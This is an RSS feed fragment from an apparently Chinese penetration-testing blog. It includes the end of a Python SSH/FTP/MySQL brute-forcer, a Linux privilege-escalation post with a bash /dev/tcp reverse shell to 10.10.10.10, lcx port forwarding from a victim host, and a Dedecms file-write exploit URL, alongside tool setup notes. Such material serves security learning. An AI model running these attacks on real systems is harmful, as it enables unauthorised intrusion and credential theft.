&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> x &lt;span style="color:#f92672">in&lt;/span> xrange(&lt;span style="color:#ae81ff">1&lt;/span>,self&lt;span style="color:#f92672">.&lt;/span>threadnum&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t &lt;span style="color:#f92672">=&lt;/span> threading&lt;span style="color:#f92672">.&lt;/span>Thread(target&lt;span style="color:#f92672">=&lt;/span>self&lt;span style="color:#f92672">.&lt;/span>thread)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> threads&lt;span style="color:#f92672">.&lt;/span>append(t)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t&lt;span style="color:#f92672">.&lt;/span>setDaemon(&lt;span style="color:#66d9ef">True&lt;/span>) &lt;span style="color:#75715e">#主线程完成后不管子线程有没有结束，直接退出&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t&lt;span style="color:#f92672">.&lt;/span>start()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>qlist&lt;span style="color:#f92672">.&lt;/span>empty():
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> time&lt;span style="color:#f92672">.&lt;/span>sleep(&lt;span style="color:#ae81ff">1&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span> &lt;span style="color:#a6e22e">KeyboardInterrupt&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>is_exit &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;Exit the program...&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;Waiting...&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> time&lt;span style="color:#f92672">.&lt;/span>sleep(&lt;span style="color:#ae81ff">5&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>show_result(self&lt;span style="color:#f92672">.&lt;/span>host,self&lt;span style="color:#f92672">.&lt;/span>result)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> finishetime &lt;span style="color:#f92672">=&lt;/span> time&lt;span style="color:#f92672">.&lt;/span>time()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;Used time: &lt;/span>&lt;span style="color:#e6db74">%f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (finishetime&lt;span style="color:#f92672">-&lt;/span>starttime)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>():
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser &lt;span style="color:#f92672">=&lt;/span> OptionParser(usage&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Usage: python %prog [options] type&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>add_option(&lt;span style="color:#e6db74">&amp;#39;-i&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;--host&amp;#39;&lt;/span>,dest&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;host&amp;#39;&lt;/span>,help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;target ip&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>add_option(&lt;span style="color:#e6db74">&amp;#39;-o&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;--timeout&amp;#39;&lt;/span>,type&lt;span style="color:#f92672">=&lt;/span>int,dest&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;timeout&amp;#39;&lt;/span>,default&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>,help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;timeout&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>add_option(&lt;span style="color:#e6db74">&amp;#39;-t&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;--thread&amp;#39;&lt;/span>,type&lt;span style="color:#f92672">=&lt;/span>int,dest&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;threadnum&amp;#39;&lt;/span>,default&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">10&lt;/span>,help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;threadnum&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>add_option(&lt;span style="color:#e6db74">&amp;#39;-L&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;--userfile&amp;#39;&lt;/span>,dest&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;userfile&amp;#39;&lt;/span>,default&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;username.txt&amp;#39;&lt;/span>,help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;userfile&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>add_option(&lt;span style="color:#e6db74">&amp;#39;-P&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;--passfile&amp;#39;&lt;/span>,dest&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;passfile&amp;#39;&lt;/span>,default&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;password.txt&amp;#39;&lt;/span>,help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;passfile&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (options, args) &lt;span style="color:#f92672">=&lt;/span> parser&lt;span style="color:#f92672">.&lt;/span>parse_args()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> args:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>print_help()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exit()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> args[&lt;span style="color:#ae81ff">0&lt;/span>]&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#e6db74">&amp;#39;ssh&amp;#39;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>host:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssh &lt;span style="color:#f92672">=&lt;/span> SshBruter(options, args)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssh&lt;span style="color:#f92672">.&lt;/span>run()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>print_help()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">elif&lt;/span> args[&lt;span style="color:#ae81ff">0&lt;/span>]&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#e6db74">&amp;#39;ftp&amp;#39;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>host:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ftp &lt;span style="color:#f92672">=&lt;/span> FtpBruter(options, args)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ftp&lt;span style="color:#f92672">.&lt;/span>run()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>print_help()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">elif&lt;/span> args[&lt;span style="color:#ae81ff">0&lt;/span>]&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#e6db74">&amp;#39;mysql&amp;#39;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>host:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> mysql &lt;span style="color:#f92672">=&lt;/span> MysqlBruter(options, args)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> mysql&lt;span style="color:#f92672">.&lt;/span>run()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>print_help()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;type must be ssh or ftp or mysql&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> __name__ &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;__main__&amp;#39;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> main()
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="0x01-尝试爆破">0x01 尝试爆破&lt;/h3>
&lt;p>&lt;img src="https://wyb0.com/img/post/bruter_help.png" alt="帮助信息">&lt;/p></description></item><item><title>Metasploit 利用 workspace 进行批量扫描爆破</title><link>https://wyb0.com/posts/2016/metasploit-use-workspace-batch-blasting/</link><pubDate>Tue, 23 Aug 2016 10:05:52 +0000</pubDate><guid>https://wyb0.com/posts/2016/metasploit-use-workspace-batch-blasting/</guid><description>&lt;h3 id="0x00-启动">0x00 启动&lt;/h3>
&lt;p>&lt;img src="https://wyb0.com/img/post/msf_start.png" alt="启动msf">&lt;/p>
&lt;h3 id="0x01-metasploit的工作平台">0x01 Metasploit的工作平台&lt;/h3>
&lt;p>在msf里的工作平台可以保存历史的一些操作信息
&lt;img src="https://wyb0.com/img/post/msf_workspace_h.png" alt="msf工作平台的帮助信息">
&lt;img src="https://wyb0.com/img/post/msf_workspace.png" alt="创建新的工作平台">&lt;/p>
&lt;h3 id="0x02-使用db_nmap扫描主机">0x02 使用db_nmap扫描主机&lt;/h3>
&lt;p>&lt;img src="https://wyb0.com/img/post/msf_nmap_lanou3g_ip.png" alt="扫描lanou3g的ip信息">
扫描后的结果会保留在工作平台中，可以用hosts和services进行查看：
&lt;img src="https://wyb0.com/img/post/msf_hosts.png" alt="查看主机列表">
&lt;img src="https://wyb0.com/img/post/msf_services.png" alt="查看服务">&lt;/p></description></item><item><title>Ubuntu 下安装 Metasploit</title><link>https://wyb0.com/posts/2016/ubuntu-install-metasploit/</link><pubDate>Thu, 18 Aug 2016 10:38:41 +0000</pubDate><guid>https://wyb0.com/posts/2016/ubuntu-install-metasploit/</guid><description>&lt;h3 id="0x00-安装metasploit">0x00 安装Metasploit&lt;/h3>
&lt;ul>
&lt;li>下载msfinstall脚本&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>$ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &amp;gt; msfinstall
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>修改文件权限&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>$ chmod 755 msfinstall
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>安装(可能时间较久)&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>$ ./msfinstall
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>更新exp&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>$ msfupdate
&lt;/code>&lt;/pre>&lt;h3 id="0x01-连接数据库">0x01 连接数据库&lt;/h3>
&lt;ul>
&lt;li>首先启动postgresql数据库&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>$ /etc/init.d/postgresql start #service postgresql start也可以
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>初始化MSF数据库(关键步骤)&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>$ msfdb init
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>运行msfconsole&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>$ msfconsole
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>在msf中查看数据库连接状态&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>msf &amp;gt; db_status
#若出现错误：Module database cache not built yet, using slow search
#则重新构建缓存，缓存构建通常需要5-10分钟左右。
#构建完成后，退出Metasploit控制台，然后重新进入即可使用数据库缓存进行搜索模块
msf &amp;gt; db_rebuild_cache
&lt;/code>&lt;/pre>&lt;h3 id="0x02-metasploit-cheat-sheet">0x02 Metasploit Cheat Sheet&lt;/h3>
&lt;p>常见命令可以看下 &lt;a href="https://www.comparitech.com/net-admin/metasploit-cheat-sheet/?_blank">https://www.comparitech.com/net-admin/metasploit-cheat-sheet/&lt;/a>&lt;/p></description></item><item><title>BurpSuite 抓手机包</title><link>https://wyb0.com/posts/2016/burpsuite-intercept-packets-of-phone/</link><pubDate>Sat, 13 Aug 2016 23:53:39 +0000</pubDate><guid>https://wyb0.com/posts/2016/burpsuite-intercept-packets-of-phone/</guid><description>&lt;h3 id="0x00-环境设置">0x00 环境设置&lt;/h3>
&lt;p>Windows Phone手机和电脑处于同一无线环境下：
&lt;img src="https://wyb0.com/img/post/burpsuite_pc_ip.png" alt="PC机的ip">
&lt;img src="https://wyb0.com/img/post/burpsuite_ip_set.png" alt="IP设置">&lt;/p>
&lt;h3 id="0x01-burpsuite设置">0x01 BurpSuite设置&lt;/h3>
&lt;p>&lt;img src="https://wyb0.com/img/post/burpsuite_set_phone_proxy1.png" alt="设置burpsuite抓8888端口的包1">
&lt;img src="https://wyb0.com/img/post/burpsuite_set_phone_proxy2.png" alt="设置burpsuite抓8888端口的包2">&lt;/p>
&lt;h3 id="0x02-抓http包">0x02 抓HTTP包&lt;/h3>
&lt;p>&lt;img src="https://wyb0.com/img/post/burpsuite_phone_visit_internet.png" alt="手机访问网络">
&lt;img src="https://wyb0.com/img/post/burpsuite_get_phone_packet.png" alt="burpsuite抓手机包">&lt;/p>
&lt;h3 id="0x03-抓https包">0x03 抓HTTPS包&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>挂burpsuite的代理下载证书
&lt;img src="https://wyb0.com/img/post/burpsuite_down_ca1.png" alt="下载证书1">
&lt;img src="https://wyb0.com/img/post/burpsuite_down_ca2.png" alt="下载证书2">&lt;/p></description></item><item><title>Web常见漏洞脑图</title><link>https://wyb0.com/posts/2016/mind-map-of-web-common-vulnerabilities/</link><pubDate>Thu, 11 Aug 2016 21:17:21 +0000</pubDate><guid>https://wyb0.com/posts/2016/mind-map-of-web-common-vulnerabilities/</guid><description>&lt;h2 id="web常见漏洞">Web常见漏洞&lt;/h2>
&lt;p>&lt;a href="https://wyb0.com/img/post/web_common_vulnerability_maps.png?_blank">&lt;img src="https://wyb0.com/img/post/web_common_vulnerability_maps.png" alt="Web常见漏洞脑图">&lt;/a>&lt;/p></description></item><item><title>Linux 下系统漏洞提权</title><link>https://wyb0.com/posts/2016/linux-use-system-vulnerabilities-elevate-privileges/</link><pubDate>Tue, 09 Aug 2016 19:23:13 +0000</pubDate><guid>https://wyb0.com/posts/2016/linux-use-system-vulnerabilities-elevate-privileges/</guid><description>&lt;h3 id="0x00-linux下的提权">0x00 Linux下的提权&lt;/h3>
&lt;p>Linux下一般都是系统漏洞提权，分为以下几个步骤：&lt;/p>
&lt;pre tabindex="0">&lt;code>1. 获取系统版本号
2. 根据系统版本号找对应exp
3. 反弹shell
4. 尝试利用
&lt;/code>&lt;/pre>&lt;h3 id="0x01-提权">0x01 提权&lt;/h3>
&lt;ul>
&lt;li>获取系统版本号
&lt;ul>
&lt;li>获取发行版本
&lt;ul>
&lt;li>cat /etc/*-release&lt;/li>
&lt;li>cat /etc/issue&lt;/li>
&lt;li>cat /etc/lsb-release&lt;/li>
&lt;li>cat /etc/redhat-release&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>获取内核版本
&lt;ul>
&lt;li>cat /proc/version&lt;/li>
&lt;li>uname -a&lt;/li>
&lt;li>uname -mrs&lt;/li>
&lt;li>rpm -q kernel&lt;/li>
&lt;li>dmesg | grep Linux&lt;/li>
&lt;li>ls /boot | grep vmlinuz&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>根据系统版本号找对应exp
&lt;ul>
&lt;li>&lt;a href="http://www.exploit-db.com">http://www.exploit-db.com&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://1337day.com">http://1337day.com&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://www.securiteam.com">http://www.securiteam.com&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://www.securityfocus.com">http://www.securityfocus.com&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://www.exploitsearch.net">http://www.exploitsearch.net&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://metasploit.com/modules">http://metasploit.com/modules&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://securityreason.com">http://securityreason.com&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://seclists.org/fulldisclosure">http://seclists.org/fulldisclosure&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://www.google.com">http://www.google.com&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>反弹shell
&lt;ul>
&lt;li>本地：&lt;code>nc -l -p 8888&lt;/code>&lt;/li>
&lt;li>目标机器：&lt;code>/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.10.10/8888 0&amp;gt;&amp;amp;1&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>尝试利用&lt;/li>
&lt;/ul>
&lt;h3 id="0x02-实例">0x02 实例&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>得到系统版本号
&lt;img src="https://wyb0.com/img/post/privilge_escalation_linux_get_sys_version.png" alt="得到系统版本号">&lt;/p></description></item><item><title>端口转发</title><link>https://wyb0.com/posts/2016/port-forwarding/</link><pubDate>Mon, 08 Aug 2016 19:33:45 +0000</pubDate><guid>https://wyb0.com/posts/2016/port-forwarding/</guid><description>&lt;h3 id="0x00-应用场景">0x00 应用场景&lt;/h3>
&lt;ul>
&lt;li>内网IP的80端口通过端口映射到了外网IP的80端口上&lt;/li>
&lt;li>内网的Web服务器通过外网IP反向代理(如Nginx)
也就是说Web服务器在内网中&lt;/li>
&lt;/ul>
&lt;h3 id="0x01-判断web是否为内网">0x01 判断Web是否为内网&lt;/h3>
&lt;ul>
&lt;li>向ping域名，查看IP是外网&lt;/li>
&lt;li>用webshell查看ip却是内网IP&lt;/li>
&lt;/ul>
&lt;h3 id="0x02-端口转发工具">0x02 端口转发工具&lt;/h3>
&lt;ul>
&lt;li>lcx&lt;/li>
&lt;li>htran&lt;/li>
&lt;li>&lt;a href="http://rootkiter.com/EarthWorm/?_blank">EarthWorm&lt;/a>&lt;/li>
&lt;li>netsh&lt;/li>
&lt;li>&lt;a href="https://github.com/sensepost/reGeorg?_blank">reGeorg&lt;/a>&lt;/li>
&lt;li>meterpreter porfwd&lt;/li>
&lt;/ul>
&lt;h3 id="0x03-lcx端口转发">0x03 lcx端口转发&lt;/h3>
&lt;ul>
&lt;li>Hacker：lcx.exe -listen 500 8888&lt;/li>
&lt;li>Victim：lcx.exe -slave hacker_ip 500 victim_ip 3389&lt;/li>
&lt;li>Hacker：cmd mstsc hacker_ip:500&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://wyb0.com/img/post/privilge_escalation_win_hacker_run_lcx.png" alt="hacker运行lcx">
&lt;img src="https://wyb0.com/img/post/privilge_escalation_win_vimctim_run_lcx.png" alt="vimctim端运行lcx">
&lt;img src="https://wyb0.com/img/post/privilge_escalation_win_hacker_remote_conn.png" alt="hacker远程连接">
&lt;img src="https://wyb0.com/img/post/privilge_escalation_win_hacker_remote_conn_success.png" alt="hacker远程连接成功">&lt;/p></description></item><item><title>导出 Windows 主机密码与开启 3389</title><link>https://wyb0.com/posts/2016/export-host-password-and-open-3389/</link><pubDate>Mon, 08 Aug 2016 08:28:27 +0000</pubDate><guid>https://wyb0.com/posts/2016/export-host-password-and-open-3389/</guid><description>&lt;h3 id="0x00-导出主机密码hash">0x00 导出主机密码hash&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>关于Windows的hash&lt;/p>
&lt;ul>
&lt;li>早期IBM设计的LM Hash算法存在弱点，微软在保持向后兼容性的同时提出了自己的挑战响应机制，即NTLM Hash&lt;/li>
&lt;li>Windows hash由LM HASH和NT HASH两部分组成，形式为：用户名称:RID:LM-HASH值:NT-HASH值&lt;/li>
&lt;li>存储Windows hash的sam文件位置为：C:\windows\system32\config\SAM&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>导出hash条件&lt;/p></description></item><item><title>Windows 下第三方服务提权</title><link>https://wyb0.com/posts/2016/windows-use-third-party-server-elevate-privileges/</link><pubDate>Sun, 07 Aug 2016 23:38:58 +0000</pubDate><guid>https://wyb0.com/posts/2016/windows-use-third-party-server-elevate-privileges/</guid><description>&lt;h3 id="0x00--mssql提权">0x00 MSSQL提权&lt;/h3>
&lt;p>MSSQL运行在system权限时才可以通过xp_cmdshell组件执行系统命令提权&lt;br>
提权条件：数据库账号是DBA权限&lt;/p></description></item><item><title>Windows 下系统漏洞提权</title><link>https://wyb0.com/posts/2016/windows-use-system-vulnerabilities-elevate-privileges/</link><pubDate>Sun, 07 Aug 2016 21:31:35 +0000</pubDate><guid>https://wyb0.com/posts/2016/windows-use-system-vulnerabilities-elevate-privileges/</guid><description>&lt;p>提权是在已经getshell但是权限不大的前提下做的&lt;/p>
&lt;h3 id="0x00-查看基本信息">0x00 查看基本信息&lt;/h3>
&lt;p>&lt;img src="https://wyb0.com/img/post/privilge_escalation_win_view_msg1.png" alt="Windows系统漏洞提权-查看基本信息1">&lt;/p>
&lt;p>&lt;img src="https://wyb0.com/img/post/privilge_escalation_win_view_msg2.png" alt="Windows系统漏洞提权-查看基本信息2">&lt;/p>
&lt;h3 id="0x01-使用cmd执行命令">0x01 使用cmd执行命令&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>尝试使用cmd执行命令
&lt;img src="https://wyb0.com/img/post/privilge_escalation_win_try_use_cmd.png" alt="Windows系统漏洞提权-尝试使用cmd执行命令">&lt;/p>
&lt;/li>
&lt;li>
&lt;p>找可写目录
&lt;img src="https://wyb0.com/img/post/privilge_escalation_win_find_wirteable_dir.png" alt="Windows系统漏洞提权-找可写目录">&lt;/p></description></item><item><title>反弹 shell 小结</title><link>https://wyb0.com/posts/2016/reverse-shell/</link><pubDate>Sat, 06 Aug 2016 08:36:53 +0000</pubDate><guid>https://wyb0.com/posts/2016/reverse-shell/</guid><description>&lt;p>当你找到一个有命令执行的主机时，你可能想要一个交互式的shell，如果你不能添加用户或者添加ssh密钥时，你就需要反弹一个shell来实现，下面的都是反弹shell的命令&lt;/p></description></item><item><title>Dedecms 远程写文件漏洞</title><link>https://wyb0.com/posts/2016/dedecms-remote-write-file-vulnerability/</link><pubDate>Fri, 05 Aug 2016 23:29:20 +0000</pubDate><guid>https://wyb0.com/posts/2016/dedecms-remote-write-file-vulnerability/</guid><description>&lt;h3 id="0x00-关于漏洞">0x00 关于漏洞&lt;/h3>
&lt;pre tabindex="0">&lt;code>Dedecms在20150618之前的版本都存在远程写文件漏洞，主要起因是Apache的解析漏洞
&lt;/code>&lt;/pre>&lt;h3 id="0x01-利用条件">0x01 利用条件&lt;/h3>
&lt;pre tabindex="0">&lt;code>dedecms版本为20150618之前的 
安装目录install下的index.php.bak文件未被删除
&lt;/code>&lt;/pre>&lt;h3 id="0x02-实例">0x02 实例&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>查看cms版本
&lt;img src="https://wyb0.com/img/post/dedecms_before_20150617_check_version.png" alt="查看织梦cms版本">&lt;/p>
&lt;/li>
&lt;li>
&lt;p>清空文件&lt;/p>
&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">http&lt;/span>&lt;span style="color:#f92672">://&lt;/span>&lt;span style="color:#a6e22e">www&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">xxxx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">com&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#a6e22e">install&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#a6e22e">index&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">bak&lt;/span>&lt;span style="color:#f92672">?&lt;/span>&lt;span style="color:#a6e22e">step&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">11&lt;/span>&lt;span style="color:#f92672">&amp;amp;&lt;/span>&lt;span style="color:#a6e22e">insLockfile&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#a6e22e">a&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;amp;&lt;/span>&lt;span style="color:#a6e22e">s_lang&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#a6e22e">a&lt;/span>&lt;span style="color:#f92672">&amp;amp;&lt;/span>&lt;span style="color:#a6e22e">install_demo_name&lt;/span>&lt;span style="color:#f92672">=../&lt;/span>&lt;span style="color:#a6e22e">data&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#a6e22e">admin&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#a6e22e">config_update&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">访问上面的链接会使服务器到http&lt;/span>&lt;span style="color:#f92672">://&lt;/span>&lt;span style="color:#a6e22e">updatenew&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">dedecms&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">com&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#a6e22e">base&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#a6e22e">v57&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#a6e22e">dedecms&lt;/span>&lt;span style="color:#f92672">/&lt;/span>
